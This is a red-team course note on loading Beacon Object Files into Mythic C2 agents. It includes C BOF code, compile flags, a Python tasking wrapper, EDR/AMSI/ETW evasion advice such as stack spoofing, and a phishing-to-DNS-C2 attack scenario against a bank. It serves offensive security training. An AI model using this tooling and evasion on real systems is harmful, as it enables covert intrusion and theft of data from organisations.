---
tags: [mythic, c2, payloads, red-team, vapt]
difficulty: advanced
module: "97 - Mythic C2 Custom Agents and Payload Generation"
topic: "97.11 Integrating BOFs in Mythic"
---

# 97.11 Integrating BOFs in Mythic

## 1. Introduction to Beacon Object Files (BOFs)

Beacon Object Files (BOFs) represent a significant leap forward in post-exploitation tradecraft. Initially popularized by the Cobalt Strike ecosystem, BOFs are compiled C code object files that execute dynamically within the memory space of a Command and Control (C2) agent. 

Unlike traditional post-exploitation mechanisms such as standalone executables or PowerShell scripts, BOFs do not require process injection, creating a new process, or touching the disk. They are passed directly to the agent in Common Object File Format (COFF), and the agent acts as a dynamic linker, resolving imports and executing the code directly in memory.

### 1.1 Why BOFs over .NET or PowerShell?
- **Evasion of AMSI and ETW:** Since there is no managed code (.NET) or PowerShell script being loaded, AMSI (Anti-Malware Scan Interface) and ETW (Event Tracing for Windows) related to those environments are entirely bypassed.
- **No Process Tracking:** Execution happens strictly within the agent's current process context, avoiding telemetry associated with `CreateProcess` or `VirtualAllocEx` cross-process injection.
- **Minimal Bandwidth:** Stripped of standard C library (libc) overhead, BOFs are incredibly small, making them highly effective over low-bandwidth or highly constrained C2 channels like DNS, ICMP, or Steganography.

## 2. Anatomy of a BOF and COFF Loading

A BOF is essentially an unlinked Windows object file (`.o` or `.obj`). When a Mythic agent receives this payload, it must implement an in-memory COFF loader. The loader parses the object file sections, allocates memory, resolves relocations, and binds imported functions before jumping to the entry point (typically a function named `go`).

### 2.1 The Dynamic Invocation Concept
BOFs cannot natively rely on standard library functions natively (like `printf`, `malloc`, or `strcmp`) because they are not linked against MSVCRT. Instead, they utilize Dynamic Function Resolution (DFR). The macro `DECLSPEC_IMPORT` is used to explicitly declare external functions that the agent's BOF loader must resolve by walking the PE Process Environment Block (PEB) and parsing the Export Address Tables (EAT) of loaded modules like `kernel32.dll` and `ntdll.dll`.

### 2.2 ASCII Diagram: Mythic BOF Execution Architecture

```text
+-------------------------------------------------------------------------+
|                        Mythic Server Architecture                         |
|  +-------------+       +-------------------+       +-----------------+  |
|  | Mythic UI   | ----> |  PostgreSQL DB    | <---- | Mythic Backend  |  |
|  +-------------+       +-------------------+       +-----------------+  |
+-------------------------------------------------------------------------+
          |
          | (1) Operator issues command: `bof_run enum_ad`
          v
+-------------------------------------------------------------------------+
|                     Mythic Command Python Wrapper                         |
|  - Parses Arguments                                                       |
|  - Reads local `enum_ad.o` file from agent codebase                       |
|  - Serializes arguments using struct packing (bof_pack)                   |
|  - Sends Task payload to the outbound C2 channel                          |
+-------------------------------------------------------------------------+
          |
          | (2) Base64 Encoded COFF + Packed Args sent via C2 Profile       |
          v
+-------------------------------------------------------------------------+
|                        Mythic Agent (e.g., Apollo)                        |
|  +-------------------------------------------------------------------+  |
|  |  Task Execution Routine                                           |  |
|  +-------------------------------------------------------------------+  |
|          |                                                              |
|          v (3) Pass payload to In-Memory BOF Loader                     |
|  +-------------------------------------------------------------------+  |
|  |  BOF / COFF Loader (In-Memory Linker)                             |  |
|  |  - Parse COFF headers and sections (.text, .rdata, .data)         |  |
|  |  - Allocate RW memory for sections                                |  |
|  |  - Resolve Relocations and Imports (e.g., KERNEL32$GetTickCount)  |  |
|  |  - Change memory permissions to RX via VirtualProtect             |  |
|  +-------------------------------------------------------------------+  |
|          |                                                              |
|          v (4) Execute Entry Point                                      |
|  +-------------------------------------------------------------------+  |
|  |  `void go(char* args, int alen)` function                         |  |
|  |  - Executes actual C code in unbacked memory                      |  |
|  |  - Calls BeaconPrintf / BeaconOutput to return results            |  |
|  +-------------------------------------------------------------------+  |
+-------------------------------------------------------------------------+
```

## 3. Developing a BOF for Mythic Integration

To successfully run a BOF within a Mythic agent, the agent needs to implement the "Beacon API" compatibility layer. This layer implements standard Cobalt Strike functions like `BeaconPrintf`, `BeaconDataParse`, `BeaconDataInt`, etc., allowing seamless porting of existing BOFs.

### 3.1 The Beacon API Extraction Logic
When arguments are passed from Mythic, they are usually packed into a binary format. The BOF uses the `BeaconData*` functions to extract them sequentially.

```c
#include <windows.h>
#include "beacon.h"

// Define Dynamic Imports mapping directly to DLL$Function
DECLSPEC_IMPORT HWND WINAPI USER32$GetForegroundWindow(void);
DECLSPEC_IMPORT int WINAPI USER32$GetWindowTextA(HWND hWnd, LPSTR lpString, int nMaxCount);
DECLSPEC_IMPORT void WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);

void go(char * args, int alen) {
    datap parser;
    int sleepTime;
    
    // Initialize the parser with the passed arguments
    BeaconDataParse(&parser, args, alen);
    
    // Extract a 32-bit integer argument passed from Mythic
    sleepTime = BeaconDataInt(&parser);
    
    BeaconPrintf(CALLBACK_OUTPUT, "Sleeping for %d milliseconds before enumeration...", sleepTime);
    KERNEL32$Sleep(sleepTime);

    // Logic: Get the title of the active window
    HWND activeWindow = USER32$GetForegroundWindow();
    if (activeWindow == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get active window.");
        return;
    }

    char windowTitle[256];
    if (USER32$GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Active Window Title: %s", windowTitle);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get window text.");
    }
}
```

### 3.2 Compilation Flags
BOFs must be compiled as position-independent object files. Linking will destroy the COFF structure needed by the agent.
Using MinGW (x64):
```bash
x86_64-w64-mingw32-gcc -c window_enum.c -o window_enum.o -O2 -Wall -m64 -Os
```
Using MSVC:
```cmd
cl.exe /c /GS- /O2 /w window_enum.c
```
The `/GS-` flag is critical in MSVC to prevent the compiler from inserting stack security checks (`__security_cookie`) which the BOF loader cannot resolve natively.

## 4. Building the Mythic Python Wrapper

In Mythic, every agent command is backed by a Python class residing on the Mythic server. This class defines the command arguments, parses user input, packs the data, and prepares the final JSON payload sent to the agent.

```python
from mythic_container.MythicCommandBase import *
import json
import base64
import struct

class BofRunArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="bof_name",
                type=ParameterType.String,
                description="The name of the BOF to execute",
            ),
            CommandParameter(
                name="sleep_time",
                type=ParameterType.Number,
                description="Time to sleep in milliseconds",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                parts = self.command_line.split(" ")
                self.add_arg("bof_name", parts[0])
                self.add_arg("sleep_time", int(parts[1]) if len(parts) > 1 else 0)
        else:
            raise Exception("No BOF name provided")

class BofRunCommand(CommandBase):
    cmd = "bof_run"
    needs_admin = False
    help_cmd = "bof_run [bof_name] [sleep_time]"
    description = "Executes a compiled BOF in memory."
    version = 1
    author = "@redteam_operator"
    argument_class = BofRunArguments
    attackmapping = ["T1059", "T1106"]

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        bof_name = taskData.args.get_arg("bof_name")
        sleep_time = taskData.args.get_arg("sleep_time")
        bof_path = f"/Mythic/agent_code/bofs/{bof_name}.o"
        
        try:
            with open(bof_path, "rb") as f:
                bof_bytes = f.read()
            
            # Pack arguments: 4-byte size followed by 4-byte integer
            # Mythic BOF argument packing format: [Total Size] [Type] [Data] ...
            packed_args = struct.pack("<I", sleep_time)
            
            taskData.args.add_arg("bof_payload", base64.b64encode(bof_bytes).decode())
            taskData.args.add_arg("bof_args", base64.b64encode(packed_args).decode())
        except Exception as e:
            response.Success = False
            response.Error = f"Failed to load BOF: {str(e)}"
            
        return response
```

## 5. OpSec Considerations and Memory Indicators

While BOFs provide substantial evasion benefits over managed code execution, their underlying memory execution mechanics are not completely invisible to an advanced EDR.

1. **Memory Allocations and Permissions:** 
   A naïve BOF loader will allocate `RWX` memory using `VirtualAlloc` for the BOF's `.text` section. `RWX` memory is a massive Indicator of Compromise (IoC) and heavily scrutinized by threat hunters. Modern implementations (such as the loader in Mythic's Apollo) allocate as `RW`, write the decoded sections, resolve imports, and finally use `VirtualProtect` to transition the memory to `RX`.
   
2. **Call Stack Analysis and Thread Profiling:** 
   When the BOF makes system calls or Win32 API calls (e.g., `NtQuerySystemInformation`), the return address on the stack will point directly into an unbacked memory region (the dynamically allocated RX region where the BOF lives). ETWTI (Event Tracing for Windows - Threat Intelligence) and EDR thread profiling engines monitor call stacks during critical API invocations. Finding a frame pointing to unbacked memory often results in an immediate termination of the process. To mitigate this, operators must employ **Stack Spoofing** techniques within the BOF loader or inside the BOF itself to weave fake, legitimate-looking return addresses into the call stack before invoking APIs.

3. **Cleanup:**
   Once the `go` function returns, the BOF loader must securely zero out the allocated memory and free it. Leaving executable unbacked memory with malicious bytecodes around is an easy win for memory scanners like Moneta or PE-Sieve.

## 6. Real-World Attack Scenario

**The Environment:** A heavily defended financial institution with a top-tier EDR deployed in strict prevention mode. Standard PowerShell memory execution and C# assembly loads via `execute-assembly` are immediately blocked and generate high-severity alerts.

**The Execution:**
1. The Red Team achieves initial access via a custom macro embedded in a phishing document, successfully executing an Apollo Mythic agent communicating over DNS to bypass proxy restrictions.
2. The team needs to enumerate active directory trust relationships without dropping standard tools like SharpHound.
3. The operator issues the command: `bof_run ldap_domain_trusts`.
4. The Mythic server dynamically reads the `ldap_domain_trusts.o` BOF, wraps it with the specified arguments, and sends it down the DNS C2 channel in small TXT record chunks.
5. Apollo receives the chunks, reassembles the object file, and passes it to the in-memory COFF loader.
6. The loader dynamically links the `wldap32.dll` and `ActiveDirectory` Win32 API calls, mapping the BOF to unbacked RX memory.
7. The BOF uses raw LDAP queries to extract domain admin information and trust keys, formats the output using `BeaconPrintf`, and cleanly zeroes its own memory space upon exit.
8. The Red Team retrieves the AD structure over the DNS channel with zero process tracking or AMSI alerts generated on the endpoint.

## 7. Chaining Opportunities

- **[[14 - Evading Signatures with Unique Mythic Payloads]]**: Combine BOFs with heavily obfuscated initial droppers. Ensure the initial agent survives long enough to load BOFs for post-exploitation.
- **[[12 - Developing Custom Mythic Agents from Scratch]]**: If building a custom agent from scratch, implementing a COFF loader is mandatory for easily extending post-exploitation capabilities without recompiling the agent.
- **[[15 - Mythic Scripting API Automating Operations]]**: Automate the execution of situational awareness BOFs (e.g., `whoami`, `netstat`) upon new callback check-ins using the Mythic scripting API.

## 8. Related Notes
- [[12 - Developing Custom Mythic Agents from Scratch]]
- [[13 - Mythic Event Feed and Team Collaboration]]
- [[14 - Evading Signatures with Unique Mythic Payloads]]
- [[15 - Mythic Scripting API Automating Operations]]
- [[22 - Advanced Memory Evasion Techniques]]
- [[88 - Cobalt Strike BOF Porting and Compatibility]]
- [[105 - Defeating ETW and EDR User-land Hooks]]
